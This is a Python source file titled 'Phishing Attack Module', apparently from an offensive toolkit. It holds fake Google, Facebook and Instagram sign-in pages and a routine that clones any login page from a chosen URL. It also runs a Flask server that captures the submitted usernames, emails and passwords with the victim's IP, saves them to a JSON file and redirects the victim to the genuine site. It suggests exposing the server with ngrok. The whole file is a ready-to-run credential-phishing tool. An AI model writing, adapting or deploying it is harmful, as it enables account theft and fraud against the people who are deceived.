#!/usr/bin/env python3
# Phishing Attack Module

from flask import Flask, request, redirect
import json, time, os, requests

PHISHING_TEMPLATES = {
    'Google': {
        'html': '''<!DOCTYPE html>
<html>
<head><title>Google Sign In</title>
<style>
body{font-family:Arial,sans-serif;background:#f5f5f5;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}
.container{background:#fff;padding:40px;border-radius:8px;box-shadow:0 2px 10px rgba(0,0,0,0.2);width:400px;text-align:center}
.logo{font-size:32px;font-weight:500;color:#4285f4;margin-bottom:20px}
.input-group{margin:12px 0}
.input-group input{width:100%;padding:12px;border:1px solid #dadce0;border-radius:4px;font-size:16px}
.input-group input:focus{border-color:#4285f4;outline:none}
.btn{width:100%;padding:12px;background:#4285f4;color:#fff;border:none;border-radius:4px;font-size:16px;cursor:pointer}
.btn:hover{background:#3367d6}
</style>
</head>
<body>
<div class="container">
<div class="logo">Google</div>
<form action="/login" method="POST">
<div class="input-group">
<input type="text" name="email" placeholder="Email or phone" required>
</div>
<div class="input-group">
<input type="password" name="password" placeholder="Password" required>
</div>
<button type="submit" class="btn">Sign in</button>
</form>
</div>
</body>
</html>''',
        'redirect': 'https://accounts.google.com'
    },
    'Facebook': {
        'html': '''<!DOCTYPE html>
<html>
<head><title>Facebook Login</title>
<style>
body{font-family:Arial,sans-serif;background:#f0f2f5;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}
.container{background:#fff;padding:40px;border-radius:8px;width:396px;text-align:center}
.logo{font-size:48px;font-weight:bold;color:#1877f2;margin-bottom:20px}
.input-group{margin:8px 0}
.input-group input{width:100%;padding:14px;border:1px solid #dddfe2;border-radius:6px;font-size:17px}
.input-group input:focus{border-color:#1877f2;outline:none}
.btn{width:100%;padding:12px;background:#1877f2;color:#fff;border:none;border-radius:6px;font-size:20px;font-weight:bold;cursor:pointer}
.btn:hover{background:#166fe5}
</style>
</head>
<body>
<div class="container">
<div class="logo">facebook</div>
<form action="/login" method="POST">
<div class="input-group">
<input type="text" name="email" placeholder="Email or phone number" required>
</div>
<div class="input-group">
<input type="password" name="password" placeholder="Password" required>
</div>
<button type="submit" class="btn">Log In</button>
</form>
</div>
</body>
</html>''',
        'redirect': 'https://www.facebook.com'
    },
    'Instagram': {
        'html': '''<!DOCTYPE html>
<html>
<head><title>Instagram Login</title>
<style>
body{font-family:Arial,sans-serif;background:#fafafa;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}
.container{background:#fff;padding:40px;border:1px solid #dbdbdb;border-radius:4px;width:350px;text-align:center}
.logo{font-size:42px;font-weight:600;font-family:Georgia,serif;margin-bottom:20px}
.input-group{margin:6px 0}
.input-group input{width:100%;padding:12px;background:#fafafa;border:1px solid #dbdbdb;border-radius:4px;font-size:14px}
.input-group input:focus{border-color:#a8a8a8;outline:none}
.btn{width:100%;padding:10px;background:#0095f6;color:#fff;border:none;border-radius:6px;font-size:14px;font-weight:bold;cursor:pointer}
.btn:hover{background:#0077c2}
</style>
</head>
<body>
<div class="container">
<div class="logo">Instagram</div>
<form action="/login" method="POST">
<div class="input-group">
<input type="text" name="username" placeholder="Phone number, username, or email" required>
</div>
<div class="input-group">
<input type="password" name="password" placeholder="Password" required>
</div>
<button type="submit" class="btn">Log In</button>
</form>
</div>
</body>
</html>''',
        'redirect': 'https://www.instagram.com'
    }
}

def run():
    print("\n" + "="*60)
    print("PHISHING ATTACK")
    print("="*60)
    
    template_names = list(PHISHING_TEMPLATES.keys())
    print("Select template:")
    for i, name in enumerate(template_names, 1):
        print(f"  [{i:02d}] {name}")
    print("  [99] Custom")
    print("  [00] Back")
    
    choice = input("> ").strip()
    
    if choice == '00':
        return
    elif choice == '99':
        target = input("Target URL to clone: ").strip()
        redirect_url = input("Redirect URL: ").strip()
        page_name = "Custom"
        try:
            r = requests.get(target, timeout=10)
            html = r.text
            html = html.replace('</form>', '<input type="hidden" name="__capture" value="1"></form>')
            html = html.replace('<form', '<form action="/login" method="POST"')
        except:
            html = "<html><body><h1>Login</h1><form action='/login' method='POST'><input name='email'><br><input name='password'><br><button>Login</button></form></body></html>"
    else:
        idx = int(choice) - 1
        if idx < 0 or idx >= len(template_names):
            print("Invalid choice")
            return
        page_name = template_names[idx]
        template = PHISHING_TEMPLATES[page_name]
        html = template['html']
        redirect_url = template['redirect']
    
    print(f"\nPhishing page ready: {page_name}")
    print("Server: http://localhost:8080")
    print("Expose with: ngrok http 8080")
    
    app = Flask(__name__)
    
    @app.route('/')
    def index():
        return html
    
    @app.route('/login', methods=['POST'])
    def login():
        data = dict(request.form)
        ip = request.remote_addr
        print(f"\n{'='*50}")
        print("[+] CREDENTIALS CAPTURED!")
        print(f"  Page: {page_name}")
        print(f"  IP: {ip}")
        for key, value in data.items():
            if key != '__capture':
                print(f"  {key}: {value}")
        print(f"{'='*50}\n")
        
        out_dir = os.path.expanduser("~/Downloads/BlackTiger_Output")
        os.makedirs(out_dir, exist_ok=True)
        with open(os.path.join(out_dir, "phishing_creds.json"), 'a') as f:
            f.write(json.dumps({"page": page_name, "ip": ip, "data": data, "time": time.time()}) + "\n")
        
        return redirect(redirect_url)
    
    try:
        app.run(host='0.0.0.0', port=8080, debug=False, threaded=True)
    except Exception as e:
        print(f"Error: {e}")
        print("Install Flask: pip install flask")

if __name__ == "__main__":
    run()